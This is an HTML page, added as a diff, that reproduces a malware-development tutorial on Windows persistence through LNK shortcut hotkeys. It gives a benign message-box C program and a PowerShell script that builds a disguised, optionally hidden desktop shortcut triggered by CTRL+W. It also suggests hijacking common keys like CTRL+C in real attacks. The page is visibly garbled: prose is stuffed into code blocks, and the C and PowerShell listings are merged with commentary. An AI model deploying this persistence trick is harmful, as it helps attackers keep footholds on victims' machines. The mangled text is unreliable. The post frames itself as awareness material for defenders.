@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 23. LNK files. Simple</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #45</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 23. LNK files. Simple</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Powershell example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is based on my own research into one of the more interesting malware persistence tricks: via Windows LNK files. LNK According to Microsoft, an LNK file serves as a shortcut or “link” in Windows, providing a reference to an original file, folder, or application. For regular users, these files serve a meaningful purpose, facilitating file organization and workspace decluttering. However,</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">from an attacker’s perspective, LNK files take on a different significance. They have been
+exploited in various documented attacks by APT groups and, to my knowledge, remain a
+viable option for activities such as phishing, establishing persistence, executing payloads.
+Do you know that Windows shortcuts can be registered using a shortcut key in terms</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">of execution? This is the main trick for malware persistence in this case.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s say we have a “malware”. As usually, meow-meow messagebox application hack.c:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.c
+evil app for windows persistence
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2023/12/10/malware-pers-23.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+And then, just create powershell script for create LNK file with the following properties:
+# Define the path for the shortcut on the desktop
+$shortcutPath = "$([Environment]::GetFolderPath('Desktop'))\Meow.lnk"
+# Create a WScript Shell object
+$wshell = New-Object -ComObject Wscript.Shell
+# Create a shortcut object
+$shortcut = $wshell.CreateShortcut($shortcutPath)
+# Set the icon location for the shortcut
+$shortcut.IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
+# Set the target path and arguments for the shortcut
+$shortcut.TargetPath = "Z:\2023-12-10-malware-pers-23\hack.exe"
+$shortcut.Arguments = ""
+# Set the working directory for the shortcut
+$shortcut.WorkingDirectory = "Z:\2023-12-10-malware-pers-23"
+# Set a hotkey for the shortcut (e.g., CTRL+W)
+$shortcut.HotKey = "CTRL+W"
+# Set a description for the shortcut
+$shortcut.Description = "Not malicious, meow-meow malware"
+# Set the window style for the shortcut (7 = Minimized window)
+$shortcut.WindowStyle = 7
+# Save the shortcut
+$shortcut.Save()
+# Optionally make the link invisible by adding 'Hidden' attribute
+# (Get-Item $shortcutPath).Attributes += 'Hidden'
+As you can see, the logic is pretty simple. We simply create a shortcut on the desktop that
+has a hotkey specified: CTRL+W. Of course, in real attack scenarios it could be something
+like CTRL+C, CTRL+V or CTRL+P, etc.
+For example, if you create a shortcut for Paint, it does not have any hotkey specified:
+
+Explorer restricts shortcut support to commands beginning with
+CTRL+ALT. Additional sequences must be set programmatically through
+COM.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all, compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For checking correctness, run it: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The just run our powershell script for persistence: Get-Content pers.ps1 | PowerShell.exe -noprofile -</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As a result, Meow LNK file is created successfully. If we look at its properties, everything is ok:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally just run it and try to trigger CTRL+W hotkey:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything worked perfectly as expected! =.. = :) This technique is used by APT groups like APT28, APT29, Kimsuky and software like Emotet in the wild. In all honesty, this method is widely employed and widespread due to its extreme convenience in deceiving the victims. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Many thanks to my friend and colleague Anton Kuznetsov, he reminded me of this technique when he presented one of his most amazing talks. ATT&CK MITRE: T1204.001 APT28 APT29 Kimsuky Emotet MSDN: Shell Link (.LNK) Binary File Format Malware persistence: part 1 source code in github</p></main></body></html>
